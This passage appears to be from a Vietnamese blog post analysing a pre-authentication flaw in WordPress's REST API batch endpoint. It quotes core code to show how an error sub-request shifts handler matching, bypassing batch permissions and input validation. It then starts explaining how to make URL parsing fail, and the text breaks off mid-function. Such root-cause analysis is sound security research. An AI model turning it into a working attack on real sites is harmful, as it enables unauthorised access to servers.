+<h4 id="rest-api-batch-request">#REST API Batch Request<a hidden class="anchor" aria-hidden="true" href="#rest-api-batch-request">#</a></h4>
+<p>Dựa vào document tìm được trên Internet: <a href="https://make.wordpress.org/core/2020/11/20/rest-api-batch-framework-in-wordpress-5-6/">REST API Batch Framework in WordPress 5.6 – Make WordPress Core</a>, ta có thể hình dung ra được chức năng của batch request là cho phép gọi hàng loạt các REST API chỉ với một request duy nhất và tính năng này đã được triển khai từ version WordPress 5.6.</p>
+<p>Để gửi một batch request, ta cần tạo <code>POST</code> request đến <code>/wp-json/batch/v1</code> endpoint với JSON body phải tồn tại <code>requests</code> field là một array chứa các request con bên trong (sub-request). Ví dụ một batch request có cấu trúc như sau:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;requests&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;method&#34;</span><span class="p">:</span> <span class="s2">&#34;PUT&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/my-ns/v1/route/1?query=param&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;headers&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;My-Header&#34;</span><span class="p">:</span> <span class="s2">&#34;my-value&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;body&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;project&#34;</span><span class="p">:</span> <span class="s2">&#34;Gutenberg&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;method&#34;</span><span class="p">:</span> <span class="s2">&#34;DELETE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/my-ns/v1/route/2?query=param&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Hàm <code>serve_request()</code> chịu trách nhiệm handle các REST API request:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api/class-wp-rest-server.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">serve_request</span><span class="p">(</span> <span class="nv">$path</span> <span class="o">=</span> <span class="k">null</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* @var WP_User|null $current_user */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">global</span> <span class="nv">$current_user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span> <span class="nv">$current_user</span> <span class="nx">instanceof</span> <span class="nx">WP_User</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nv">$current_user</span><span class="o">-&gt;</span><span class="na">exists</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$current_user</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check_authentication</span><span class="p">();</span> <span class="c1">//[1]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//...
+</span></span></span></code></pre></div><p>Tại [1], thực hiện check authentication thông qua <code>rest_authentication_errors</code> filter, và filter này tiếp tục gọi qua 2 callback:</p>
+<ul>
+<li>rest_application_password_check_errors</li>
+<li>rest_cookie_check_errors</li>
+</ul>
+<p>Đầu tiên sẽ đi qua <code>rest_application_password_check_errors</code>, chổ này do ta không xác thực thông qua password nên sẽ skip qua. Tiếp đến <code>rest_cookie_check_errors</code> callback sẽ kiểm tra một số điền kiện:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">rest_cookie_check_errors</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">// ... 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">global</span> <span class="nv">$wp_rest_auth_cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;_wpnonce&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">       <span class="nv">$nonce</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;_wpnonce&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_WP_NONCE&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">       <span class="nv">$nonce</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_WP_NONCE&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">null</span> <span class="o">===</span> <span class="nv">$nonce</span> <span class="p">)</span> <span class="p">{</span>  <span class="c1">// [2]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="c1">// No nonce at all, so act as if it&#39;s an unauthenticated request.  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="nx">wp_set_current_user</span><span class="p">(</span> <span class="mi">0</span> <span class="p">);</span>  
+</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="k">true</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>chỉ đơn giản là nếu ta không cung cấp <code>HTTP_X_WP_NONCE</code> header hoặc <code>_wpnonce</code> param thì điều kiện tại [2] sẽ auto pass và sẽ được truy cập bằng quyền <code>Anonymous User</code>.</p>
+<p>Sau đó, tiếp tục gọi tới hàm <code>dispatch()</code> sẽ thực hiện match request đến một handler tương ứng để gọi callback xử lý, và thực hiện các bước input validation đảm bảo rằng request cung cấp đầy đủ các param và value có data type phù hợp</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api/class-wp-rest-server.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">dispatch</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dispatching_requests</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$error</span>   <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$matched</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">match_request_to_handler</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">list</span><span class="p">(</span> <span class="nv">$route</span><span class="p">,</span> <span class="nv">$handler</span> <span class="p">)</span> <span class="o">=</span> <span class="nv">$matched</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">is_callable</span><span class="p">(</span> <span class="nv">$handler</span><span class="p">[</span><span class="s1">&#39;callback&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$error</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="nv">$check_required</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">has_valid_params</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$check_required</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$check_required</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="nv">$check_sanitized</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">sanitize_params</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$check_sanitized</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$check_sanitized</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">respond_to_request</span><span class="p">(</span> <span class="nv">$request</span><span class="p">,</span> <span class="nv">$route</span><span class="p">,</span> <span class="nv">$handler</span><span class="p">,</span> <span class="nv">$error</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span></code></pre></div><p>Giả sử đối với <code>/batch/v1</code> route thì sẽ match với handler có callback là <code>serve_batch_request_v1</code>, kèm theo một số trường dữ liệu bắt buộc với data type quy định ở biến <code>args</code>
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/3.png"></p>
+<p>Hàm <code>serve_batch_request_v1()</code> sẽ là nơi chịu trách nhiệm chính
+để handle các batch request. Về cơ bản cũng sẽ thao tác giống so với handle các REST API như bên cho các sub-request bao gồm parsing, matching các route đến những handler phù hợp và gọi đến các callback xử lý tương ứng.</p>
+<p>Có thể hiểu nôm na quá trình xử lý theo thứ tự như sau:</p>
+<ol>
+<li>Loop qua các sub-request bên trong <code>requests</code> field của batch request để thực hiện parse các route path, set body, set header, set query param cho từng sub-request object và add từng sub-request object vào biến array <code>$requests</code></li>
+<li>Khởi tạo 2 biến quan trọng bao gồm:
+<ul>
+<li><code>$matches</code>: là một array chứa các handler cho từng sub-request dựa trên route path theo thứ tự</li>
+<li><code>$validation</code>: là một array chứa kết quả sau khi đã validation/sanitization các input params của các sub-request tương ứng</li>
+</ul>
+</li>
+<li>Loop các sub-request object thực hiện một loạt các bước validation:
+<ul>
+<li>Match request object vào đúng handler xử lý dựa vào <code>route path</code> và <code>method</code>, sau đó add vào biến <code>$matches</code></li>
+<li>Kiểm tra xem handler này có được cho phép gọi thông qua batch request hay không?</li>
+<li>Gọi <code>has_valid_params()</code> để check request có bao gồm đủ các params hay không? Và gọi tiếp <code>sanitize_params()</code> để check value của các params này có đúng data type hay chưa? Từng route path sẽ define một validation schema riêng chứa các rule cho từng tham số. Kết quả sẽ lưu vào biến <code>$error</code> và cuối cùng, add vào array <code>$validation</code></li>
+</ul>
+</li>
+<li>Tiếp tục, loop theo thứ tự index của các sub-request object, lấy các handler từ <code>$matches</code> tương ứng theo index của sub-request object và call hàm <code>respond_to_request()</code>:
+<ul>
+<li>Nếu giá trị <code>$validation</code> tương ứng không phải là error sẽ đi tiếp</li>
+<li>Gọi <code>$handler['permission_callback']</code> để check permission trước khi hành động</li>
+<li>Nếu thõa mãn, sẽ gọi <code>call_user_func( $handler['callback'], $request )</code> xử lý sub-request với callback tương ứng.</li>
+</ul>
+</li>
+</ol>
+<h4 id="the-confusion">#The confusion<a hidden class="anchor" aria-hidden="true" href="#the-confusion">#</a></h4>
+<p>Dựa vào bản vá, ta có thể thấy điểm bất thường nằm ở step 3 khi thực hiện matching sub-request với handler tương ứng của nó:
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/4.png"></p>
+<blockquote>
+<p>Tự đặt câu hỏi trong đầu rằng: &ldquo;<em>Dòng code được bổ sung có ý nghĩa gì để ngăn chặn lỗ hổng này?</em>&rdquo;.</p>
+</blockquote>
+<p>Ta thấy rằng, dòng code được bổ sung ngay bên trong câu điều kiện <code>is_wp_error( $single_request )</code>, vậy thì khả năng rất có vấn đề khi xử lý một sub-request bị lỗi. Code snippet sau sẽ mô tả lại cách hoạt động của step 3:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api/class-wp-rest-server.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$requests</span> <span class="k">as</span> <span class="nv">$single_request</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$single_request</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$has_error</span>    <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$validation</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$single_request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$match</span>     <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">match_request_to_handler</span><span class="p">(</span> <span class="nv">$single_request</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$matches</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$match</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$error</span>     <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$match</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$match</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$error</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">list</span><span class="p">(</span> <span class="nv">$route</span><span class="p">,</span> <span class="nv">$handler</span> <span class="p">)</span> <span class="o">=</span> <span class="nv">$match</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$handler</span><span class="p">[</span><span class="s1">&#39;allow_batch&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$allow_batch</span> <span class="o">=</span> <span class="nv">$handler</span><span class="p">[</span><span class="s1">&#39;allow_batch&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$route_options</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_route_options</span><span class="p">(</span> <span class="nv">$route</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$allow_batch</span>   <span class="o">=</span> <span class="nv">$route_options</span><span class="p">[</span><span class="s1">&#39;allow_batch&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$allow_batch</span> <span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$allow_batch</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$error</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;rest_batch_not_allowed&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;The requested route does not support batch requests.&#39;</span> <span class="p">),</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">array</span><span class="p">(</span> <span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="mi">400</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$error</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$check_required</span> <span class="o">=</span> <span class="nv">$single_request</span><span class="o">-&gt;</span><span class="na">has_valid_params</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$check_required</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$check_required</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$error</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$check_sanitized</span> <span class="o">=</span> <span class="nv">$single_request</span><span class="o">-&gt;</span><span class="na">sanitize_params</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$check_sanitized</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$check_sanitized</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$error</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$has_error</span>    <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$validation</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$error</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$validation</span><span class="p">[]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>Hãy tưởng tượng rằng, trong quá trình thực hiện matching handler, nếu ta cung cấp <code>3 sub-request với request đầu tiên bị lỗi</code> trong quá trình parsing thì có thể được mô phỏng lại luồng như sau:</p>
+<ul>
+<li>
+<p>Phase 1: Khởi tạo các biến:</p>
+<ul>
+<li>$requests = <code>array( Request(&quot;/error/route&quot;, &quot;PUT&quot;), Request(&quot;/wp/v2/users&quot;, &quot;POST&quot;), Request(&quot;/wp/v2/posts&quot;, &quot;POST&quot;) )</code></li>
+<li>$matches    = <code>array()</code></li>
+<li>$validation = <code>array()</code></li>
+</ul>
+</li>
+<li>
+<p>Phase 2: Loop qua tất cả sub-request object:</p>
+<ul>
+<li>
+<p>Round 1: Check <code>Request(&quot;/error/route&quot;, &quot;PUT&quot;)</code> là một request lỗi nên:</p>
+<ul>
+<li>$validation = <code>[ WP_ERR(&quot;/error/route&quot;, &quot;PUT&quot;) ]</code></li>
+<li>$matches = <code>[]</code></li>
+</ul>
+</li>
+<li>
+<p>Round 2: Check <code>Request(&quot;/wp/v2/users&quot;, &quot;POST&quot;)</code> là một valid request nên:</p>
+<ul>
+<li>$validation = <code>[ WP_ERR(&quot;/error/route&quot;, &quot;PUT&quot;), true]</code></li>
+<li>$matches = <code>[ Handler(&quot;create_user_handler&quot;) ]</code></li>
+</ul>
+</li>
+<li>
+<p>Round 2: Check <code>Request(&quot;/wp/v2/posts&quot;, &quot;POST&quot;)</code> là một valid request nên:</p>
+<ul>
+<li>$validation = <code>[ WP_ERR(&quot;/error/route&quot;, &quot;PUT&quot;), true, true]</code></li>
+<li>$matches = <code>[ Handler(&quot;create_user_handler&quot;), Handler(&quot;create_post_handler&quot;) ]</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Phase 3: Loop theo index các sub-request object:</p>
+<ul>
+<li>Round 1: <code>index=0</code> là $requests[0] = <code>Request(&quot;/error/route&quot;, &quot;PUT&quot;)</code> -&gt; lỗi nên skip</li>
+<li>Round 2: <code>index=1</code> là $requests[1] = <code>Request(&quot;/wp/v2/users&quot;, &quot;POST&quot;)</code> -&gt; valid -&gt; gọi $matches[1] = <code>Handler(&quot;create_post_handler&quot;)</code></li>
+<li>Round 3: <code>index=2</code> là $requests[2] = <code>Request(&quot;/wp/v2/posts&quot;, &quot;POST&quot;)</code> -&gt; valid -&gt; gọi $matches[2] = <code>null</code></li>
+</ul>
+</li>
+</ul>
+<p>Rõ ràng ta thấy sự sai logic ở quá trình này, vì đáng lẽ ra với endpoint <code>/wp/v2/users</code> thì phải được xử lý bởi  <code>create_user_handler</code>, nhưng theo logic hiện tại thì lại sử dụng <code>create_post_handler</code> handler. Điều này là nguyên nhân chính dẫn đến lỗ hổng khi trường hợp gặp một error sub-request, cụ thể là không thực hiện add giá trị nào đó để đảm bảo thứ tự handler trong biến <code>$matches</code> phù hợp với từng sub-request route path.</p>
+<p>Với lỗi logic này làm tăng lên bề mặt tấn công bao gồm:</p>
+<ul>
+<li>Có thể gọi bất kỳ handler mà không được phép gọi từ batch request (not <code>allow_batch</code>)</li>
+<li>Bypass input validation schema nghĩa là sử dụng request data của handler này cho một handler khác, cái mà đúng ra phải thực hiện validation params cho từng handler tương ứng</li>
+</ul>
+<blockquote>
+<p>Vấn đề tiếp theo là: <em>Làm sao để tạo ra một error sub-request (WP_ERR)?</em></p>
+</blockquote>
+<p>Tại step 1 của flow trên ta có:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api/class-wp-rest-server.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$batch_request</span><span class="p">[</span><span class="s1">&#39;requests&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$args</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$parsed_url</span> <span class="o">=</span> <span class="nx">wp_parse_url</span><span class="p">(</span> <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="p">);</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">false</span> <span class="o">===</span> <span class="nv">$parsed_url</span> <span class="p">)</span> <span class="p">{</span>  <span class="c1">// [3]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$requests</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span> <span class="s1">&#39;parse_path_failed&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;Could not parse the path.&#39;</span> <span class="p">),</span> <span class="k">array</span><span class="p">(</span> <span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="mi">400</span> <span class="p">)</span> <span class="p">);</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span></code></pre></div><p>có vẻ cách duy nhất để tạo ra request lỗi (WP_Error) là break logic phân tích của hàm <code>wp_parse_url()</code> và force nó trả về <code>false</code> tại [3]. Hàm <code>wp_parse_url()</code> như sau:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/http.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">wp_parse_url</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="nv">$component</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$to_unset</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$url</span>      <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$url</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;//&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">       <span class="nv">$to_unset</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;scheme&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">       <span class="nv">$url</span>        <span class="o">=</span> <span class="s1">&#39;placeholder:&#39;</span> <span class="o">.</span> <span class="nv">$url</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
